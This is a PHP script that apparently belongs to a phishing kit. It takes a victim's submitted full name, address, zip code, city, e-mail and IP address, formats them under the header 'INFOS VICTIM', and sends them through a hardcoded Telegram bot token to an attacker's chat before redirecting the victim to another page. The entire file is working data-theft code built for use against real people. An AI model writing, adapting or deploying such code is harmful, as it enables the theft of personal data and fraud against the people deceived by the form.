﻿<?php
session_start();

$fname=$_POST["fname"];

$_SESSION['fname'] = $fname;

$addy=$_POST["addy"];

$_SESSION['addy'] = $addy;

$zip=$_POST["zip"];

$_SESSION['zip'] = $zip;

$reg=$_POST["reg"];

$_SESSION['reg'] = $reg;

$mail=$_POST["mail"];

$_SESSION['mail'] = $mail;

   function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  

$msg = "
----------- 👉🏻🤠🇩🇰 INFOS VICTIM 🇩🇰🤠👈🏻-----------------

FULL NAME  : ".$_SESSION['fname']."

ADDRESS    : ".$_SESSION['addy']."

ZIP        : ".$_SESSION['zip']."

CITY       : ".$_SESSION['reg']."

E-Mail     : ".$_SESSION['mail']."

IP : $ip

----------- 👉🏻🤠🇩🇰 INFOS VICTIM 🇩🇰🤠👈🏻-----------------";

$token = "6039160288:AAELj7POP_QJm4Fp_IfFhiYXMXpEnR9iaek";
$data = [
    'text' => $msg,
    'chat_id' => '-948225816'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: load.php");
?>